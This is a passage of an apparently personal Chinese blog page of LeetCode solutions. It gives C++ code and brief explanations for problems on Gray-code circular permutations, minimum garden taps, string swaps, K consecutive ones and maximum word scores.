class="type">int</span>&gt; res;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">circularPermutation</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="number">1</span> &lt;&lt; n;</span><br><span class="line">        res = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len);</span><br><span class="line">        <span class="type">int</span> split = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; split; j++) &#123;</span><br><span class="line">                <span class="built_in">cal</span>(len/split*j, len/split*(j+<span class="number">1</span>), a);</span><br><span class="line">                <span class="keyword">if</span>(j%<span class="number">2</span>==<span class="number">0</span>) a = !a;</span><br><span class="line">            &#125;</span><br><span class="line">            split &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            res[i] = res[i] ^ start;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">cal</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; j; i++) &#123;</span><br><span class="line">            res[i] &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            res[i] += a&amp;<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>格雷码有他的生成公式</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">circularPermutation</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ret</span><span class="params">(<span class="number">1</span> &lt;&lt; n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ret.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            ret[i] = (i &gt;&gt; <span class="number">1</span>) ^ i ^ start;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1326-灌溉花园的最少水龙头数目"><a href="#1326-灌溉花园的最少水龙头数目" class="headerlink" title="1326. 灌溉花园的最少水龙头数目"></a><a href="https://leetcode.cn/problems/minimum-number-of-taps-to-open-to-water-a-garden/description/">1326. 灌溉花园的最少水龙头数目</a></h2><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minTaps</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt;&amp; ranges)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>, INT_MAX)</span>, <span class="title">index</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) index[i] = i;</span><br><span class="line">        <span class="built_in">sort</span>(index.<span class="built_in">begin</span>(), index.<span class="built_in">end</span>(), [&amp;ranges](<span class="type">int</span> i, <span class="type">int</span> j)-&gt;<span class="type">bool</span>&#123;<span class="keyword">return</span> i-ranges[i] &lt; j-ranges[j];&#125;);</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> start = <span class="built_in">max</span>(index[i] - ranges[index[i]], <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> end = <span class="built_in">min</span>(index[i] + ranges[index[i]], n);</span><br><span class="line">            <span class="keyword">if</span>(dp[start] == INT_MAX) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = start; j &lt;= end; j++) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[start]+<span class="number">1</span>, dp[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>$dp[i]$表示区间$[0, i]$被灌溉所需的最少水龙头数<br>将$ranges[i]$按照$i-ranges[i]$从小到大排序<br>按顺序遍历排序好的ranges，计算其$start,end$<br>$start$处已经计算出其所需最小水龙头数了，有两种情况</p><ul><li>当前$ [0, x] $已知, $ start &lt;&#x3D; end &lt;&#x3D; x $, 则$[start, end]$之间最少水龙头数保持不变</li><li>当前$ [0, x] $已知, $ start &lt;&#x3D; x &lt; end $, 则$[start+1, end]$之间最少水龙头数为$dp[start]+1$</li><li>当前$ [0, x] $已知, $ x &lt; start &lt;&#x3D; end $, 则无解</li></ul></blockquote><h3 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minTaps</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt;&amp; ranges)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">right</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) right[<span class="built_in">max</span>(<span class="number">0</span>, i-ranges[i])] = <span class="built_in">max</span>(<span class="built_in">min</span>(i + ranges[i],n), right[<span class="built_in">max</span>(<span class="number">0</span>, i-ranges[i])]);</span><br><span class="line">        <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> pre = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            last = <span class="built_in">max</span>(last, right[i]);</span><br><span class="line">            <span class="keyword">if</span>(i == last) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">if</span>(i == pre) &#123;</span><br><span class="line">                ret++;</span><br><span class="line">                pre = last;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>$right[start]$表示从$start$位置，经过某个水龙头的浇灌最远能到达的位置<br>$last$表示当前最远到达的位置，$pre$表示上一个使用的水龙头最远的位置<br>从左向右遍历，一边遍历一遍寻找最远能到达的位置，如果$i$到达了最远能到达的位置且不是n，说明无法覆盖。如果i遇到了前一个水龙头的边界，说明接下来该使用下一个水龙头了</p></blockquote><h2 id="1247-交换字符使得字符串相同"><a href="#1247-交换字符使得字符串相同" class="headerlink" title="1247. 交换字符使得字符串相同"></a><a href="https://leetcode.cn/problems/minimum-swaps-to-make-strings-equal/description/">1247. 交换字符使得字符串相同</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumSwap</span><span class="params">(string s1, string s2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> len = s1.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i= <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s1[i] == <span class="string">&#x27;x&#x27;</span> &amp;&amp; s2[i] == <span class="string">&#x27;y&#x27;</span>) &#123;</span><br><span class="line">                count[<span class="number">0</span>][<span class="number">1</span>]++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(s1[i] == <span class="string">&#x27;y&#x27;</span> &amp;&amp; s2[i] == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">                count[<span class="number">1</span>][<span class="number">0</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = count[<span class="number">0</span>][<span class="number">1</span>]/<span class="number">2</span> + count[<span class="number">1</span>][<span class="number">0</span>]/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(count[<span class="number">0</span>][<span class="number">1</span>]%<span class="number">2</span> == <span class="number">1</span> &amp;&amp; count[<span class="number">1</span>][<span class="number">0</span>]%<span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            res+=<span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(count[<span class="number">0</span>][<span class="number">1</span>]%<span class="number">2</span> || count[<span class="number">1</span>][<span class="number">0</span>]%<span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>根据题目的样例 “xx”+”yy”型(“yy”+”xx”型)，只需要一步<br>“xy”+”yx”型(“yx”+”xy”型)，需要两步<br>交换时可以两个字符串上任意两个位置进行交换。</p></blockquote><h2 id="1703-得到连续-K-个-1-的最少相邻交换次数"><a href="#1703-得到连续-K-个-1-的最少相邻交换次数" class="headerlink" title="1703. 得到连续 K 个 1 的最少相邻交换次数"></a><a href="https://leetcode.cn/problems/minimum-adjacent-swaps-for-k-consecutive-ones/">1703. 得到连续 K 个 1 的最少相邻交换次数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">this</span>-&gt;k = k;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; index, wait;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                index.<span class="built_in">push</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            wait.<span class="built_in">push</span>(index.<span class="built_in">front</span>());</span><br><span class="line">            index.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> minn = <span class="built_in">cal</span>(wait);</span><br><span class="line">        <span class="keyword">while</span>(!index.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            wait.<span class="built_in">push</span>(index.<span class="built_in">front</span>());</span><br><span class="line">            index.<span class="built_in">pop</span>();</span><br><span class="line">            wait.<span class="built_in">pop</span>();</span><br><span class="line">            minn = <span class="built_in">min</span>(<span class="built_in">cal</span>(wait), minn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">cal</span><span class="params">(queue&lt;<span class="type">int</span>&gt; q)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>, count = <span class="number">1</span>, last = q.<span class="built_in">front</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k/<span class="number">2</span>; i++) &#123;</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            l += count * (q.<span class="built_in">front</span>() - last - <span class="number">1</span>);</span><br><span class="line">            count++;</span><br><span class="line">            last  = q.<span class="built_in">front</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        last = q.<span class="built_in">front</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = k/<span class="number">2</span>; i &lt; k<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            r += (k - i - <span class="number">1</span>) * (q.<span class="built_in">front</span>() - last - <span class="number">1</span>);</span><br><span class="line">            last  = q.<span class="built_in">front</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l + r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>两个队列 <code>index</code> 和 <code>que</code><br>index存放值为1的下表<br>从index取k个放入que<br>计算que的长度<br>que中pop一个，index也pop一个放入index，再次计算index，直到index为空<br>取每次计算que的最小值<br>que计算长度时，从中间一分为二，将两边的1向最中间的1靠拢移动。</p></blockquote><h3 id="优化1"><a href="#优化1" class="headerlink" title="优化1"></a>优化1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, count = <span class="number">0</span>, n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">this</span>-&gt;k = k;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">index</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="type">int</span> minn = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                index[j] = i;</span><br><span class="line">                j++;</span><br><span class="line">                <span class="keyword">if</span>(j &gt;= k) &#123;</span><br><span class="line">                    minn = <span class="built_in">min</span>(<span class="built_in">cal</span>(<span class="built_in">move</span>(index), count), minn);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">cal</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;&amp; v, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> li = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = k/<span class="number">2</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            li += (v[i+start] - v[i+start<span class="number">-1</span>] - <span class="number">1</span>);</span><br><span class="line">            l += li;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ri = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = k/<span class="number">2</span>; i &lt; k<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            ri += (v[i+start+<span class="number">1</span>] - v[i+start] - <span class="number">1</span>);</span><br><span class="line">            r += ri;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l + r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> minn = <span class="number">0</span>, cost = <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; left&#123;<span class="number">0</span>&#125;, zero;</span><br><span class="line">        <span class="type">int</span> leftSum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; n &amp;&amp; nums[i] == <span class="number">0</span>; i++);</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; n;) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="type">int</span> count;</span><br><span class="line">            <span class="keyword">for</span>(count = <span class="number">0</span>; i &lt; n &amp;&amp; nums[i] == <span class="number">0</span>; i++, count++);</span><br><span class="line">            leftSum += count;</span><br><span class="line">            <span class="keyword">if</span>(i &lt; n) &#123;</span><br><span class="line">                zero.<span class="built_in">push_back</span>(count);</span><br><span class="line">                left.<span class="built_in">push_back</span>(leftSum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = k<span class="number">-2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = l; i &lt;= r; i++) &#123;</span><br><span class="line">            cost += zero[i] * <span class="built_in">min</span>(<span class="number">1</span>+i, <span class="number">1</span>+r-i);</span><br><span class="line">        &#125;</span><br><span class="line">        minn=cost;</span><br><span class="line">        <span class="type">int</span> nn = zero.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = k<span class="number">-1</span>; j &lt; nn; i++, j++) &#123;</span><br><span class="line">            <span class="type">int</span> mid = (i+j)/<span class="number">2</span>;</span><br><span class="line">            cost -= left[mid] - left[i<span class="number">-1</span>];</span><br><span class="line">            cost += left[j+<span class="number">1</span>] - left[mid+k%<span class="number">2</span>];</span><br><span class="line">            minn = <span class="built_in">min</span>(minn, cost);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://leetcode.cn/problems/minimum-adjacent-swaps-for-k-consecutive-ones/solutions/627364/duo-tu-xin-shou-jiao-cheng-yi-bu-bu-dai-6bps4/">参考题解</a>， 就是找到窗口滑动时，cost的O(1)的更新方法</p></blockquote><h2 id="1255-得分最高的单词集合"><a href="#1255-得分最高的单词集合" class="headerlink" title="1255. 得分最高的单词集合"></a><a href="https://leetcode.cn/problems/maximum-score-words-formed-by-letters/description/">1255. 得分最高的单词集合</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> wn;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxScoreWords</span><span class="params">(vector&lt;string&gt;&amp; words, vector&lt;<span class="type">char</span>&gt;&amp; letters, vector&lt;<span class="type">int</span>&gt;&amp; score)</span> </span>&#123;</span><br><span class="line">        wn = words.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ln = letters.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; letterCount = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ln; i++) &#123;</span><br><span class="line">            letterCount[letters[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dfs</span>(<span class="number">0</span>, words, score, letterCount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> index, vector&lt;string&gt;&amp; words, vector&lt;<span class="type">int</span>&gt;&amp; score, vector&lt;<span class="type">int</span>&gt; state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt;= wn) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> scoreNext = <span class="built_in">dfs</span>(index+<span class="number">1</span>, words, score, state);</span><br><span class="line">        <span class="type">int</span> wlen = words[index].<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> scorei = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; wlen; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(state[words[index][i] - <span class="string">&#x27;a&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                state[words[index][i] - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">                scorei += score[words[index][i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> scoreNext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(scoreNext, scorei + <span class="built_in">dfs</span>(index+<span class="number">1</span>, words, score, state));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>艺术，就是暴搜！！！<br>然后再记录一下当前状态下，26个字母当前剩余个数</p></blockquote><h3 id="状态压缩，但是负优化"><a href="#状态压缩，但是负优化" class="headerlink" title="状态压缩，但是负优化"></a>状态压缩，但是负优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxScoreWords</span><span class="params">(vector&lt;string&gt;&amp; words, vector&lt;<span class="type">char</span>&gt;&amp; letters, vector&lt;<span class="type">int</span>&gt;&amp; score)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> wn = words.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ln = letters.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; letterCount = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ln; i++) &#123;</span><br><span class="line">            letterCount[letters[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 